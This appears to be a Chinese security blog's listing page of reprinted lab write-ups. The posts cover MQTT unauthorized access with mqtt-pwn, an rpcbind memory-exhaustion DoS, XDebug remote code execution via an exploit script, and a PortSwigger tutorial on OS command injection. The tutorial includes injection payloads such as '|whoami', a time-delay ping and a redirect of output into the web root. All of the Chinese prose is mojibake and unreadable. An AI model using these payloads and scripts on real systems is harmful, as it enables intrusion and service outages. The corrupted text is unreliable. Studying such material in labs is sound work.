  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/MQTT-Pwd/">
                MQTTæœªæˆæƒæ¼æ´åˆ©ç”¨
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="mqttæœªæˆæƒæ¼æ´åˆ©ç”¨">MQTTæœªæˆæƒæ¼æ´åˆ©ç”¨</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.cnblogs.com/suyu7/p/15290972.html">å”å°é£</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h3><span id="1-æ‰«æç«¯å£">1ã€æ‰«æç«¯å£</span></h3><blockquote>
<p><img src="/2024/01/19/MQTT-Pwd/1.png" alt="image"></p>
</blockquote>
<h3><span id="2-mqtt-pwdå®‰è£…">2ã€mqtt-pwdå®‰è£…</span></h3><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akamai-threat-research/mqtt-pwn.git</span><br><span class="line"><span class="built_in">cd</span> mqtt-pwd</span><br><span class="line">docker-compose up --build --detach</span><br><span class="line">docker-compose run cli</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">discovery</span><br><span class="line">scans</span><br><span class="line">scans -i 1</span><br><span class="line">topics</span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/MQTT-Pwd/2.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/MQTT/" rel="tag">MQTT</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/07/RPCBind-DDOS/">
                111ç«¯å£rpcbindæ¼æ´
            </a>
        </h2>
    
    <time>
        Dec 7, 2023
    </time>
    <section class="content">
        <h1><span id="111ç«¯å£rpcbindæ¼æ´">111ç«¯å£rpcbindæ¼æ´</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44110913/article/details/108852581">Mamba start</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="ç®€ä»‹">ç®€ä»‹</span></h2><blockquote>
<p>rpcbindæ˜¯NFSä¸­ç”¨æ¥è¿›è¡Œæ¶ˆæ¯é€šçŸ¥çš„æœåŠ¡</p>
</blockquote>
<h2><span id="å®éªŒç¯å¢ƒ">å®éªŒç¯å¢ƒ</span></h2><blockquote>
<p>æ”»å‡»æœºï¼š<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a> linux<br>ip:192.168.172.134<br>ç›®æ ‡æœºï¼šMetasploittable2<br>ip:192.168.172.129</p>
</blockquote>
<h2><span id="æ”»å‡»è¿‡ç¨‹">æ”»å‡»è¿‡ç¨‹</span></h2><h3><span id="step1ä½¿ç”¨nmapæ¢æµ‹">step1:ä½¿ç”¨nmapæ¢æµ‹</span></h3><blockquote>
<p>å‘½ä»¤ï¼š<code>nmap 192.168.172.129</code></p>
<p>å‘½ä»¤ï¼š<code>nmap -sV -p 111 192.168.172.129</code></p>
<p>å‘½ä»¤ï¼š<code>nmap -p 111 --script=rpcinfo 192.168.172.129</code></p>
</blockquote>
<h3><span id="step2metasploitæ¨¡å—æ¢æµ‹">step2:metasploitæ¨¡å—æ¢æµ‹</span></h3><blockquote>
<p>å¯åŠ¨msf</p>
<p>å‘½ä»¤ï¼š<code>use auxiliary/scanner/misc/sunrpc_portmapper</code></p>
<p>å‘½ä»¤ï¼š<code>show options</code></p>
<p>æœ¬æ–‡è®²çš„æ˜¯åªéœ€60å­—èŠ‚å°±å¯é€šè¿‡rpcbindè®©æœåŠ¡å™¨å´©æºƒï¼Œå…¨ä¸–ç•Œçš„äººéƒ½çŸ¥é“è¿™ç©æ„å„¿çš„ç”¨å¤„ï¼Œäººä»¬å°±è¿™ä¹ˆä»»ç”±å®ƒä¸€ç›´å¼€ç€ï¼Œæ— è¯­ã€‚æ‰€ä»¥ï¼Œè¦ä¹ˆè¡¥ä¸Šï¼Œè¦ä¹ˆå…³é—­å§ã€‚</p>
</blockquote>
<h2><span id="å†™åœ¨åé¢">å†™åœ¨åé¢</span></h2><blockquote>
<p>å‘rpcbindæœåŠ¡çš„UDPå¥—æ¥å­—å‘é€60å­—èŠ‚è½½è·ï¼Œä¾¿å¯å¡«å……ç›®æ ‡å†…å­˜ï¼Œæå´©ä¸»æœºç³»ç»Ÿã€‚<br>åœ­å¤šÂ·ä¹Œå…°è‚¯ï¼Œè¯¥æ¼æ´å‘ç°è€…å…¼â€œRpcbombâ€æ¼æ´åˆ©ç”¨ç¨‹åºå¼€å‘è€…ï¼ŒæŠ±æ€¨ç§°è¯¥è½¯ä»¶åŒ…ç»´æŠ¤è€…æ¯«æ— ååº”ï¼Œä»–ä¸å¾—ä¸è‡ªå·±å†™äº†è¡¥ä¸ã€‚</p>
<p>æ¼æ´åˆ©ç”¨&amp;è¡¥ä¸ï¼š<a target="_blank" rel="noopener" href="https://github.com/guidovranken/rpcbomb">https://github.com/guidovranken/rpcbomb</a></p>
<p>ä»–å†™é“ï¼ŒShodanæœç´¢å‘ç°ï¼Œäº’è”ç½‘ä¸Šå¼€æ”¾ rpcbind 111 ç«¯å£çš„ä¸»æœºæœ‰180ä¸‡å°ã€‚å…¶ä¸­å¤§å¤šæ•°éƒ½è¿è¡Œåœ¨AWSä¹‹ç±»å¤§è§„æ¨¡æ‰˜ç®¡ä¸Šï¼Œç”¨æˆ·æ€»æ˜¯ç›´æ¥æ²¿ç”¨Linuxå‘è¡Œç‰ˆçš„é»˜è®¤é…ç½®(111ç«¯å£å¼€æ”¾)ã€‚</p>
<p>å¦‚æœä½ çœŸçš„éœ€è¦ä½¿ç”¨rpcbindæœåŠ¡(å°†è¿œç¨‹è¿‡ç¨‹è°ƒç”¨RPCä¸åœ°å€ç»‘å®š)ï¼Œå°±æŠŠå®ƒç½®äºé˜²ç«å¢™åï¼Œé™åˆ¶111ç«¯å£å¯¹å¤–å¼€æ”¾å§ã€‚æœ€å¥½å°±æ˜¯ç›´æ¥å…³äº†ã€‚</p>
<p>GitHubä¸Šçš„è¡¥ä¸è¶³å¤Ÿå°ï¼Œå¼€å‘è€…ä»¬åº”è¯¥å¯ä»¥éªŒè¯è¿™äº›è¡¥ä¸çš„çŸ­å°ç²¾æ‚ï¼šrpcbindåªéœ€è¦ä¸¤è¡Œä»£ç å°±èƒ½ä¿®å¤ï¼Œä¸åƒlibtirpcè¦256è¡Œã€‚</p>
<p>ä¹Œå…°è‚¯ç§°ï¼Œè¯¥æ¼æ´å¯ä½¿æ”»å‡»è€…åœ¨è¿œç¨‹rpcbindç»‘å®šä¸»æœºä¸Šåˆ†é…ä»»æ„å¤§å°çš„å†…å­˜(æ¯æ¬¡æ”»å‡»æœ€é«˜å¯è¾¾4GB)ï¼Œé™¤éè¿›ç¨‹å´©æºƒï¼Œæˆ–è€…ç®¡ç†å‘˜æŒ‚èµ·&#x2F;é‡å¯rpcbindæœåŠ¡ï¼Œå¦åˆ™è¯¥å†…å­˜ä¸ä¼šè¢«é‡Šæ”¾ã€‚</p>
<p>å½“ç„¶ï¼Œé™¤äº†ä¸æ–­å ç”¨ç›®æ ‡ç³»ç»Ÿçš„å†…å­˜ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥å¹²åˆ«çš„äº‹ï¼Œå› ä¸ºæœ‰äº›è½¯ä»¶åœ¨å†…å­˜åˆ†é…å¤±è´¥çš„æ—¶å€™ï¼Œæ˜¯ä¼šå‘ç”Ÿä¸å¯é¢„çŸ¥çš„é”™è¯¯çš„ã€‚</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RPCBind/" rel="tag">RPCBind</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/07/XDebug-RCE/">
                XDebug è¿œç¨‹è°ƒè¯•æ¼æ´ï¼ˆä»£ç æ‰§è¡Œï¼‰
            </a>
        </h2>
    
    <time>
        Dec 7, 2023
    </time>
    <section class="content">
        <h1><span id="xdebug-è¿œç¨‹è°ƒè¯•æ¼æ´ä»£ç æ‰§è¡Œ">XDebug è¿œç¨‹è°ƒè¯•æ¼æ´ï¼ˆä»£ç æ‰§è¡Œï¼‰</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://joker-vip.github.io/2021/12/06/XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89/">joker0xxx3</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="ç®€ä»‹">ç®€ä»‹</span></h2><blockquote>
<p>XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®<code>remote_connect_back = 1</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>ï¼Œç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–<code>X-Forwarded-For</code>å¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚</p>
<p>æ›´å¤šè¯´æ˜å¯å‚è€ƒï¼š</p>
<ul>
<li>[[<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface/]]">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface\]]</a>(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface])(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface)</li>
<li><a target="_blank" rel="noopener" href="https://xdebug.org/">https://xdebug.org</a></li>
</ul>
</blockquote>
<h2><span id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</span></h2><blockquote>
<p>å¯åŠ¨å®Œæˆåï¼Œè®¿é—®<code>http://192.168.44.132:8080/</code>å³å¯å‘ç°ä¸»é¡µæ˜¯ä¸€ä¸ªç®€å•çš„phpinfoï¼Œåœ¨å…¶ä¸­å¯ä»¥æ‰¾åˆ°xdebugçš„é…ç½®ï¼Œå¯è§å¼€å¯äº†è¿œç¨‹è°ƒè¯•ã€‚</p>
<p><img src="/2023/12/07/XDebug-RCE/1.png" alt="image"></p>
<p>å› ä¸ºéœ€è¦ä½¿ç”¨dbgpåè®®ä¸ç›®æ ‡æœåŠ¡å™¨é€šä¿¡ï¼Œæ‰€ä»¥æ— æ³•ç”¨httpåè®®å¤ç°æ¼æ´ã€‚</p>
<p>æˆ‘ç¼–å†™äº†ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">æ¼æ´å¤ç°è„šæœ¬</a>ï¼ŒæŒ‡å®šç›®æ ‡webåœ°å€ã€å¾…æ‰§è¡Œçš„phpä»£ç å³å¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¦æ±‚ç”¨python3å¹¶å®‰è£…requestsåº“</span></span><br><span class="line">python3 exp.py -t http://192.168.44.132:8080/index.php -c <span class="string">&#x27;shell_exec(&#x27;</span><span class="built_in">id</span><span class="string">&#x27;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/07/XDebug-RCE/2.png" alt="image"></p>
<p><strong>é‡è¦è¯´æ˜ï¼šå› ä¸ºè¯¥é€šä¿¡æ˜¯ä¸€ä¸ªåå‘è¿æ¥çš„è¿‡ç¨‹ï¼Œexp.pyå¯åŠ¨åå…¶å®æ˜¯ä¼šç›‘å¬æœ¬åœ°çš„9000ç«¯å£ï¼ˆå¯é€šè¿‡-lå‚æ•°æŒ‡å®šï¼‰å¹¶ç­‰å¾…XDebugå‰æ¥è¿æ¥ï¼Œæ‰€ä»¥æ‰§è¡Œè¯¥è„šæœ¬çš„æœåŠ¡å™¨å¿…é¡»æœ‰å¤–ç½‘IPï¼ˆæˆ–è€…ä¸ç›®æ ‡æœåŠ¡å™¨å¤„äºåŒä¸€å†…ç½‘ï¼‰ã€‚</strong></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XDebug/" rel="tag">XDebug</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/07/OS-Command-Injection/">
                PortSwigger Academy | OS command injection æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥
            </a>
        </h2>
    
    <time>
        Dec 7, 2023
    </time>
    <section class="content">
        <h1><span id="portswigger-academy-os-command-injection-æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥">PortSwigger Academy | OS command injection : æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42942594/article/details/112474186">en0_0</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="æ€»ç»“">æ€»ç»“</span></h2><blockquote>
<ul>
<li><p><code>&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1</code> æœ‰æ—¶å€™éœ€è¦urlç¼–ç </p>
</li>
<li><p><code>productId=1&amp;storeId=1|whoami</code> POSTæ–¹æ³•ä¸èƒ½ç”¨<code>&amp;</code></p>
<p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯OSå‘½ä»¤æ³¨å…¥ï¼Œæè¿°å¦‚ä½•æ£€æµ‹å’Œåˆ©ç”¨æ¼æ´ï¼Œä¸ºä¸åŒçš„æ“ä½œç³»ç»Ÿæ‹¼å†™ä¸€äº›æœ‰ç”¨çš„å‘½ä»¤å’ŒæŠ€æœ¯ï¼Œå¹¶æ€»ç»“å¦‚ä½•é˜²æ­¢OSå‘½ä»¤æ³¨å…¥ã€‚</p>
<p><img src="/2023/12/07/OS-Command-Injection/1.png" alt="image"></p>
</li>
</ul>
</blockquote>
<h2><span id="ä»€ä¹ˆæ˜¯oså‘½ä»¤æ³¨å…¥">ä»€ä¹ˆæ˜¯OSå‘½ä»¤æ³¨å…¥ï¼Ÿ</span></h2><blockquote>
<p>æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸ºå¤–å£³ç¨‹åºæ³¨å…¥ï¼‰æ˜¯ä¸€ä¸ªWebå®‰å…¨æ¼æ´ï¼Œå®ƒä½¿æ”»å‡»è€…å¯ä»¥åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰å‘½ä»¤ï¼Œå¹¶ä¸”é€šå¸¸ä¼šå®Œå…¨ç ´åè¯¥åº”ç”¨ç¨‹åºåŠå…¶æ‰€æœ‰æ•°æ®ã€‚ æ”»å‡»è€…é€šå¸¸å¯ä»¥åˆ©ç”¨OSå‘½ä»¤æ³¨å…¥æ¼æ´æ¥ç ´åæ‰˜ç®¡åŸºç¡€ç»“æ„çš„å…¶ä»–éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¿¡ä»»å…³ç³»å°†æ”»å‡»è½¬ç§»åˆ°ç»„ç»‡å†…çš„å…¶ä»–ç³»ç»Ÿã€‚</p>
</blockquote>
<h2><span id="æ‰§è¡Œä»»æ„å‘½ä»¤">æ‰§è¡Œä»»æ„å‘½ä»¤</span></h2><blockquote>
<p>è€ƒè™‘ä¸€ä¸ªè´­ç‰©åº”ç”¨ç¨‹åºï¼Œè¯¥åº”ç”¨ç¨‹åºä½¿ç”¨æˆ·å¯ä»¥æŸ¥çœ‹ç‰¹å®šå•†åº—ä¸­æŸå•†å“æ˜¯å¦æœ‰åº“å­˜ã€‚ è¯¥ä¿¡æ¯å¯é€šè¿‡å¦‚ä¸‹ç½‘å€è®¿é—®ï¼š</p>
<p><code>https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code></p>
<p>ä¸ºäº†æä¾›åº“å­˜ä¿¡æ¯ï¼Œåº”ç”¨ç¨‹åºå¿…é¡»æŸ¥è¯¢å„ç§æ—§ç³»ç»Ÿã€‚ ç”±äºå†å²åŸå› ï¼Œè¯¥åŠŸèƒ½æ˜¯é€šè¿‡ä½¿ç”¨äº§å“å’Œå­˜å‚¨IDä½œä¸ºå‚æ•°è°ƒç”¨shellå‘½ä»¤æ¥å®ç°çš„ï¼š</p>
<p><code>stockreport.pl 381 29</code><br>æ­¤å‘½ä»¤è¾“å‡ºæŒ‡å®šé¡¹ç›®çš„åº“å­˜çŠ¶æ€ï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·ã€‚</p>
<p>ç”±äºè¯¥åº”ç”¨ç¨‹åºæ— æ³•é˜²å¾¡OSå‘½ä»¤æ³¨å…¥ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æäº¤ä»¥ä¸‹è¾“å…¥ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p>
<p><code>&amp; echo aiwefwlguh &amp;</code></p>
<p>å¦‚æœæ­¤è¾“å…¥æ˜¯åœ¨productIDå‚æ•°ä¸­æäº¤çš„ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºæ‰§è¡Œçš„å‘½ä»¤æ˜¯ï¼š</p>
<p><code>stockreport.pl &amp; echo aiwefwlguh &amp; 29</code></p>
<p>echoå‘½ä»¤åªæ˜¯ä½¿æä¾›çš„å­—ç¬¦ä¸²åœ¨è¾“å‡ºä¸­å›æ˜¾ï¼Œå¹¶ä¸”æ˜¯æµ‹è¯•æŸäº›ç±»å‹çš„OSå‘½ä»¤æ³¨å…¥çš„æœ‰ç”¨æ–¹æ³•ã€‚ &amp; å­—ç¬¦æ˜¯shellå‘½ä»¤åˆ†éš”ç¬¦ï¼Œå› æ­¤æ‰§è¡Œçš„å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¥ä¸€ä¸ªçš„ä¸‰ä¸ªç‹¬ç«‹å‘½ä»¤ã€‚ ç»“æœï¼Œè¿”å›ç»™ç”¨æˆ·çš„è¾“å‡ºä¸ºï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error - productID was not provided</span><br><span class="line">aiwefwlguh</span><br><span class="line">29: command not found</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºçš„ä¸‰è¡Œè¡¨æ˜ï¼š</p>
<p>åŸå§‹çš„stockreport.plå‘½ä»¤åœ¨æ²¡æœ‰é¢„æœŸå‚æ•°çš„æƒ…å†µä¸‹æ‰§è¡Œï¼Œå› æ­¤è¿”å›äº†é”™è¯¯æ¶ˆæ¯ã€‚</p>
<p>æ‰§è¡Œæ³¨å…¥çš„echoå‘½ä»¤ï¼Œå¹¶ä¸”åœ¨è¾“å‡ºä¸­å›æ˜¾æä¾›çš„å­—ç¬¦ä¸²ã€‚</p>
<p>åŸå§‹å‚æ•°29ä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´é”™è¯¯ã€‚</p>
<p>é€šå¸¸ï¼Œå°†é™„åŠ å‘½ä»¤åˆ†éš”ç¬¦&amp;æ”¾ç½®åœ¨æ³¨å…¥å‘½ä»¤ä¹‹åæ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå› ä¸ºè¿™ä¼šå°†æ³¨å…¥å‘½ä»¤ä¸æ³¨å…¥ç‚¹åé¢çš„å†…å®¹åˆ†å¼€ã€‚ è¿™å‡å°‘äº†éšåå‘ç”Ÿçš„äº‹ä»¶é˜»æ­¢æ³¨å…¥çš„å‘½ä»¤æ‰§è¡Œçš„å¯èƒ½æ€§ã€‚</p>
</blockquote>
<h4><span id="lab-os-command-injection-simple-case">Lab: OS command injection, simple case</span></h4><blockquote>
<p><code>productId=1&amp;storeId=1|whoami</code></p>
<p><img src="/2023/12/07/OS-Command-Injection/2.png" alt="image"></p>
</blockquote>
<h3><span id="æœ‰ç”¨çš„å‘½ä»¤">æœ‰ç”¨çš„å‘½ä»¤</span></h3><blockquote>
<p>å½“æ‚¨ç¡®å®šäº†OSå‘½ä»¤æ³¨å…¥æ¼æ´åï¼Œé€šå¸¸å¯ä»¥æ‰§è¡Œä¸€äº›åˆå§‹å‘½ä»¤æ¥è·å–æœ‰å…³æ‚¨å—åˆ°ç ´åçš„ç³»ç»Ÿçš„ä¿¡æ¯ã€‚ ä»¥ä¸‹æ˜¯åœ¨Linuxå’ŒWindowså¹³å°ä¸Šæœ‰ç”¨çš„ä¸€äº›å‘½ä»¤çš„æ‘˜è¦ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤ç›®çš„</th>
<th>Linux</th>
<th>Windows</th>
</tr>
</thead>
<tbody><tr>
<td>å½“å‰ç”¨æˆ·çš„åç§°</td>
<td>whoami</td>
<td>whoami</td>
</tr>
<tr>
<td>æ“ä½œç³»ç»Ÿ</td>
<td>uname -a</td>
<td>ver</td>
</tr>
<tr>
<td>ç½‘ç»œé…ç½®</td>
<td>ifconfig</td>
<td>ipconfig &#x2F; all</td>
</tr>
<tr>
<td>ç½‘ç»œè¿æ¥</td>
<td>netstat -an</td>
<td>netstat -an</td>
</tr>
<tr>
<td>è¿è¡Œè¿›ç¨‹</td>
<td>ps -ef</td>
<td>tasklist</td>
</tr>
</tbody></table>
</blockquote>
<h2><span id="æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´ç›²æ³¨">æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´ç›²æ³¨</span></h2><blockquote>
<p>OSå‘½ä»¤æ³¨å…¥çš„è®¸å¤šå®ä¾‹éƒ½æ˜¯ç›²æ³¨çš„æ¼æ´ã€‚ è¿™æ„å‘³ç€åº”ç”¨ç¨‹åºä¸ä¼šåœ¨å…¶HTTPå“åº”ä¸­è¿”å›å‘½ä»¤çš„è¾“å‡ºã€‚ ç›²æ³¨æ¼æ´ä»ç„¶å¯ä»¥è¢«åˆ©ç”¨ï¼Œä½†æ˜¯éœ€è¦ä¸åŒçš„æŠ€æœ¯ã€‚</p>
<p>è€ƒè™‘ä¸€ä¸ªå…è®¸ç”¨æˆ·æäº¤æœ‰å…³è¯¥ç«™ç‚¹çš„åé¦ˆçš„ç½‘ç«™ã€‚ ç”¨æˆ·è¾“å…¥ä»–ä»¬çš„ç”µå­é‚®ä»¶åœ°å€å’Œåé¦ˆæ¶ˆæ¯ã€‚ ç„¶åï¼ŒæœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºä¼šå‘ç«™ç‚¹ç®¡ç†å‘˜ç”Ÿæˆä¸€å°åŒ…å«åé¦ˆçš„ç”µå­é‚®ä»¶ã€‚ ä¸ºæ­¤ï¼Œå®ƒä½¿ç”¨æäº¤çš„è¯¦ç»†ä¿¡æ¯è°ƒå‡ºé‚®ä»¶ç¨‹åºã€‚ ä¾‹å¦‚ï¼š</p>
<p><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code></p>
<p>mailå‘½ä»¤çš„è¾“å‡ºï¼ˆå¦‚æœæœ‰ï¼‰ä¸ä¼šåœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤ä½¿ç”¨echoæœ‰æ•ˆè´Ÿè½½å°†æ— æ•ˆã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¤šç§å…¶ä»–æŠ€æœ¯æ¥æ£€æµ‹å’Œåˆ©ç”¨æ¼æ´ã€‚</p>
</blockquote>
<h3><span id="ä½¿ç”¨æ—¶é—´å»¶è¿Ÿæ£€æµ‹ç›²æ³¨oså‘½ä»¤æ³¨å…¥">ä½¿ç”¨æ—¶é—´å»¶è¿Ÿæ£€æµ‹ç›²æ³¨OSå‘½ä»¤æ³¨å…¥</span></h3><blockquote>
<p>æ‚¨å¯ä»¥ä½¿ç”¨æ³¨å…¥çš„å‘½ä»¤æ¥è§¦å‘æ—¶é—´å»¶è¿Ÿï¼Œä»è€Œå…è®¸æ‚¨æ ¹æ®åº”ç”¨ç¨‹åºå“åº”çš„æ—¶é—´æ¥ç¡®è®¤å‘½ä»¤å·²æ‰§è¡Œã€‚ pingå‘½ä»¤æ˜¯æ‰§è¡Œæ­¤æ“ä½œçš„æœ‰æ•ˆæ–¹æ³•ï¼Œå› ä¸ºå®ƒä½¿æ‚¨å¯ä»¥æŒ‡å®šè¦å‘é€çš„ICMPæ•°æ®åŒ…çš„æ•°é‡ï¼Œä»è€ŒæŒ‡å®šè¯¥å‘½ä»¤è¿è¡Œæ‰€èŠ±è´¹çš„æ—¶é—´ï¼š</p>
<p><code>&amp; ping -c 10 127.0.0.1 &amp;</code></p>
<p>æ­¤å‘½ä»¤å°†å¯¼è‡´åº”ç”¨ç¨‹åºpingå…¶ç¯å›ç½‘ç»œé€‚é…å™¨10ç§’é’Ÿã€‚</p>
</blockquote>
<h4><span id="lab-blind-os-command-injection-with-time-delays">Lab: Blind OS command injection with time delays</span></h4><blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=j25Ci6owysrme8z4HvkicgC1hqXWr0Yz&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1&amp;message=1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/07/OS-Command-Injection/3.png" alt="image"></p>
</blockquote>
<h3><span id="é€šè¿‡é‡å®šå‘è¾“å‡ºæ¥åˆ©ç”¨ç›²æ³¨oså‘½ä»¤æ³¨å…¥">é€šè¿‡é‡å®šå‘è¾“å‡ºæ¥åˆ©ç”¨ç›²æ³¨OSå‘½ä»¤æ³¨å…¥</span></h3><blockquote>
<p>æ‚¨å¯ä»¥å°†æ³¨å…¥å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°Webæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­ï¼Œç„¶åå¯ä»¥ä½¿ç”¨æµè§ˆå™¨è¿›è¡Œæ£€ç´¢ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä»æ–‡ä»¶ç³»ç»Ÿä½ç½®&#x2F;var&#x2F;www&#x2F;staticæä¾›é™æ€èµ„æºï¼Œåˆ™å¯ä»¥æäº¤ä»¥ä¸‹è¾“å…¥ï¼š</p>
<p><code>&amp; whoami&gt; /var/www/static/whoami.txt &amp;</code></p>
<p><code>&gt;</code>å­—ç¬¦å°†whoamiå‘½ä»¤çš„è¾“å‡ºå‘é€åˆ°æŒ‡å®šæ–‡ä»¶ã€‚ ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æµè§ˆå™¨è·å–<a target="_blank" rel="noopener" href="https://vulnerable-website.com/whoami.txt%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E3%80%82">https://vulnerable-website.com/whoami.txtæ¥æ£€ç´¢æ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹æ³¨å…¥å‘½ä»¤çš„è¾“å‡ºã€‚</a></p>
</blockquote>
